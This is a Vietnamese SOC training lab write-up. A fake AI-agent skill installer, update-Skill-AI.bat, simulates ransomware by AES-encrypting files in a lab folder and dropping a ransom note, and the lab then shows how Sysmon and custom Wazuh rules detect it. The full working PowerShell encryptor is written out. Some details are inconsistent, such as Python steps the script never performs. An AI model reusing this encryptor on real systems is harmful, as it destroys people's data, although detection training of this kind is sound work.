
> 🎬 **Video hướng dẫn / diễn tập (Lab2):** [https://drive.google.com/file/d/1AeZ5oU1szkyJ1sqpkVlzUH0aWNRoJn8R/view?usp=sharing](https://drive.google.com/file/d/1AeZ5oU1szkyJ1sqpkVlzUH0aWNRoJn8R/view?usp=sharing)

Kịch bản 2: NGƯỜI DÙNG TẢI FILE CẤU HÌNH SKILL CHO AI AGENT CÓ CHỨA MÃ HÓA RANSOMWARE

1. Mô tả tình huống

Mục tiêu: Huấn luyện SOC Analyst phát hiện hành vi thực thi tệp .bat chứa độc hại, lệnh gọi PowerShell xáo trộn (obfuscation) và quá trình xóa dữ liệu khôi phục để tiến hành mã hóa tệp tin tống tiền.

Mô tả ngắn: Nhân viên kế toán đang cài đặt AI agent để làm trợ lý cá nhân, nhân viên download 1 file cấu hình cài đặt skill cho AI

Trên máy người dùng, chức năng hiển thị phần mở rộng tệp đang bị tắt. Vì vậy, Windows Explorer không hiển thị đầy đủ tên thật của tệp là: update-Skill-AI.bat

Người dùng chỉ nhìn thấy tên update-Skill-AI và biểu tượng tệp, nên có thể nhầm đây là một tệp cấu hình hoặc trình cài đặt thông thường của AI Agent. Do không kiểm tra thuộc tính tệp và nguồn tải, người dùng nhấp đúp để thực thi. 

Mô tả ngắn: Nhân viên kế toán đang cài đặt AI agent để làm trợ lý cá nhân, nhân viên download 1 file cấu hình cài đặt skill cho AI, mã được viết trực tiếp trên powershell có chức năng mã hóa và tạo reverse shell.

2. Mô hình triển khai Lab

3. Chuẩn bị môi trường

4. Cấu hình môi trường ban đầu

New-Item -Path C:\Sysmon -ItemType Directory -Force

Invoke-WebRequest `

  -Uri "https://download.sysinternals.com/files/Sysmon.zip" `

  -OutFile "C:\Sysmon\Sysmon.zip"

Expand-Archive `

  -Path "C:\Sysmon\Sysmon.zip" `

  -DestinationPath "C:\Sysmon" `

  -Force

Cấu hình Sysmon

Tạo file sysmon-ransomware.xml

<Sysmon schemaversion="4.90">

  <HashAlgorithms>SHA256</HashAlgorithms>

  <EventFiltering>

    <ProcessCreate onmatch="include">

      <Rule groupRelation="or">

        <Image condition="end with">\cmd.exe</Image>

        <Image condition="end with">\powershell.exe</Image>

        <Image condition="end with">\python.exe</Image>

        <Image condition="end with">\py.exe</Image>

      </Rule>

    </ProcessCreate>

    <NetworkConnect onmatch="include">

      <Rule groupRelation="or">

        <Image condition="end with">\python.exe</Image>

        <Image condition="end with">\powershell.exe</Image>

      </Rule>

    </NetworkConnect>

    <FileCreate onmatch="include">

      <Rule groupRelation="or">

        <TargetFilename condition="end with">.encrypted</TargetFilename>

        <TargetFilename condition="end with">\README_RANSOM.txt</TargetFilename>

        <TargetFilename condition="end with">\thekey.key</TargetFilename>

        <TargetFilename condition="end with">\ransom.py</TargetFilename>

      </Rule>

    </FileCreate>

  </EventFiltering>

</Sysmon>

Sau đó cài đặt để sysmon update: Sysmon64.exe -accepteula -i sysmon-ransomware.xml

Rồi kiểm tra dịch vụ:  Get-Service Sysmon64

Tiếp theo kiểm tra cấu hình đang áp dụng:

C:\Sysmon\Sysmon64.exe -c

Chương trình chỉ xử lý các file nằm trực tiếp trong thư mục:

C:\Users\Admin\Downloads\Tailieunoibo

Phạm vi này được giới hạn nhằm bảo đảm hành vi mô phỏng không ảnh hưởng đến dữ liệu nằm ngoài thư mục lab. 

Bước 1. Chuẩn bị tài liệu nội bộ giả lập

Chuẩn bị một số tài liệu mẫu, bao gồm file văn bản và tài liệu nội bộ giả lập. Các file này được sử dụng làm dữ liệu đầu vào cho quá trình mô phỏng mã hóa.

Có thể sử dụng các file trong drive này : https://drive.google.com/drive/folders/1iV_WWebgqby3DwfRzwl9jJ1-gi-hlAHi

Bước 2. Tạo snapshot hoặc bản sao lưu 

Trước khi chạy chương trình mô phỏng, tạo snapshot cho máy Windows hoặc sao lưu toàn bộ thư mục Tailieunoibo.

Bước 3. Chuẩn bị tệp giả mạo cập nhật AI Agent update-Skill-AI.bat 

Tạo file update-Skill-AI.bat và lưu tại thư mục Downloads. Nội dung chương trình xác định thư mục kiểm thử, tạo file Python trung gian ransom.py, sinh khóa mã hóa và xử lý các tệp nằm trực tiếp trong thư mục Tailieunoibo.

@echo off

setlocal enabledelayedexpansion

set "LAB_DIR=C:\Users\admin\Downloads\Tailieunoibo"

set "KEY_FILE=%LAB_DIR%\thekey.key"

set "EXT=.encrypted"

if not exist "%LAB_DIR%" mkdir "%LAB_DIR%"

echo [*] Bat dau mo phong ransomware tu file BAT...

echo [*] Thu muc lam viec: %LAB_DIR%

powershell.exe -NoProfile -ExecutionPolicy Bypass -Command ^

"$lab = '%LAB_DIR%'; $keyFile = '%KEY_FILE%'; $ext = '%EXT%'; ^

$excluded = @('simulation.bat', 'ransom.bat', 'thekey.key', 'decrypt.bat', 'README_RANSOM.txt'); ^

$files = Get-ChildItem -Path $lab -File; ^

$key = [byte[]]::new(32); ^

$rng = [System.Security.Cryptography.RNGCryptoServiceProvider]::Create(); ^

$rng.GetBytes($key); ^

[System.IO.File]::WriteAllBytes($keyFile, $key); ^

Write-Host '[+] Da tao khoa AES-256 tai' $keyFile; ^

$count = 0; ^

foreach ($f in $files) { ^

    $name = $f.Name; ^

    if ($excluded -contains $name) { continue; } ^

    if ($name -like ('*' + $ext)) { continue; } ^

    try { ^

        $bytes = [System.IO.File]::ReadAllBytes($f.FullName); ^

        $iv = [byte[]]::new(16); ^

        $rng.GetBytes($iv); ^

        $aes = [System.Security.Cryptography.Aes]::Create(); ^

        $aes.Key = $key; ^

        $aes.IV = $iv; ^

        $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC; ^

        $aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7; ^

        $encryptor = $aes.CreateEncryptor(); ^

        $cipher = $encryptor.TransformFinalBlock($bytes, 0, $bytes.Length); ^

        [System.IO.File]::WriteAllBytes($f.FullName, $iv + $cipher); ^

        $newName = $f.FullName + $ext; ^

        Rename-Item -Path $f.FullName -NewName $newName; ^

        Write-Host '[+] Ma hoa va ghi de: ' $newName; ^

        $count++; ^

    } catch { ^

        Write-Host '[!] Loi voi file' $f.Name ': ' $_.Exception.Message; ^

    } ^

} ^

if ($count -gt 0) { ^

    $note = Join-Path $lab 'README_RANSOM.txt'; ^

    $content = 'Your files have been encrypted with AES-256.\nContact us at fake@ransom.com or pay 0.5 BTC.\nDo not rename or modify encrypted files.'; ^

    [System.IO.File]::WriteAllText($note, $content); ^

    Write-Host '[+] Da tao ransom note: ' $note; ^

} ^

Write-Host '[+] Hoan thanh. Da ma hoa ' $count ' file.'"

echo.

echo === HOAN THANH ===

pause

endlocal

5. Các bước thực hiện tấn công

Sau khi file update-Skill-AI.bat được thực thi, chương trình mã hóa các tài liệu nằm trực tiếp trong thư mục:C:\Users\Admin\Downloads\Tailieunoibo

Kết quả kiểm tra cho thấy nội dung của các tài liệu Word và file văn bản đã bị thay thế bằng chuỗi dữ liệu mã hóa. Các file vẫn giữ nguyên tên và phần mở rộng ban đầu nhưng không còn hiển thị được nội dung gốc. 

Sau khi thực thi file BAT, nội dung các tài liệu trong thư mục Tailieunoibo đã bị mã hóa và không còn đọc được bình thường. Nhiều file có cùng thời gian chỉnh sửa, đồng thời xuất hiện thêm ransom_note và thekey.key, cho thấy quá trình mã hóa hàng loạt đã 

6. Kiểm tra trên SIEM

Sau khi chương trình mô phỏng được thực thi, Wazuh File Integrity Monitoring ghi nhận nhiều sự kiện thay đổi dữ liệu phát sinh từ máy Windows agent.name:

DESKTOP-1HJ4R28

Wazuh đã ghi nhận thành công hành vi thực thi đáng ngờ trên máy DESKTOP-1HJ4R28 thông qua Sysmon Event ID 1. Tiến trình cmd.exe thực thi tệp update-Skill-Ai.bat, sau đó khởi chạy powershell.exe với tham số -ExecutionPolicy Bypass. Nội dung command line chứa các API mã hóa như System.Security.Cryptography.Aes, RNGCryptoServiceProvider và TransformFinalBlock, đồng thời thực hiện ghi đè dữ liệu, đổi tên tệp sang phần mở rộng .encrypted, tạo khóa thekey.key và thông báo đòi tiền chuộc README_RANSOM.txt. Wazuh đã sinh cảnh báo rule 92029, mức độ 6 và ánh xạ kỹ thuật MITRE ATT&CK T1059.001 – PowerShell. Các dấu hiệu trên cho thấy chuỗi thực thi phù hợp với hành vi mô phỏng ransomware. Để củng cố kết luận, cần đối chiếu thêm Sysmon Event ID 11 hoặc Wazuh FIM nhằm xác nhận nhiều tệp .encrypted được tạo trong thời gian ngắn.

7. Xây dựng custom rule trên Wazuh

Rule được xây dựng nhằm phát hiện trường hợp một trình thông dịch lệnh hoặc công cụ thực thi script như cmd.exe, PowerShell, WScript hoặc CScript khởi chạy tiến trình Python.

Trong kịch bản thử nghiệm, người dùng thực thi tệp giả mạo cập nhật kỹ năng AI. Tệp này gọi cmd.exe, sau đó khởi chạy Python để thực thi mã nguồn bên trong. Vì vậy, chuỗi tiến trình cần giám sát là: cmd.exe hoặc trình thực thi script python.exe 

Đăng nhập Wazuh Dashboard.

Đi theo đường dẫn:

Rule 110380 được xây dựng để phát hiện hành vi PowerShell có dấu hiệu mô phỏng ransomware. Rule kế thừa từ cảnh báo 92029, sau đó kiểm tra command line có đồng thời ExecutionPolicy Bypass và một trong các chuỗi liên quan đến mã hóa như TransformFinalBlock, Cryptography.Aes hoặc RNGCryptoServiceProvider. Khi thỏa điều kiện, Wazuh sinh cảnh báo mức 12, cho thấy mức độ nguy hiểm cao, đồng thời ánh xạ hành vi với MITRE ATT&CK T1059.001 – PowerShell và T1486 – Data Encrypted for Impact. Rule này giúp giảm cảnh báo nhiễu vì không chỉ phát hiện PowerShell, mà còn yêu cầu xuất hiện thêm dấu hiệu mã hóa dữ liệu.

8. Kiểm tra trên SIEM

Wazuh phát hiện chuỗi thực thi đáng ngờ khi tệp update-Skill-AI.bat khởi chạy cmd.exe, sau đó gọi tiến trình Python. Custom rule 110380 được kích hoạt và ghi nhận đầy đủ thông tin tiến trình cha và tiến trình con.

Dùng để test_rule

{"win":{"system":{"eventID":"1"},"eventdata":{"image":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","parentImage":"C:\\Windows\\System32\\cmd.exe","commandLine":"powershell.exe -NoProfile -ExecutionPolicy Bypass -Command System.Security.Cryptography.Aes TransformFinalBlock"}}}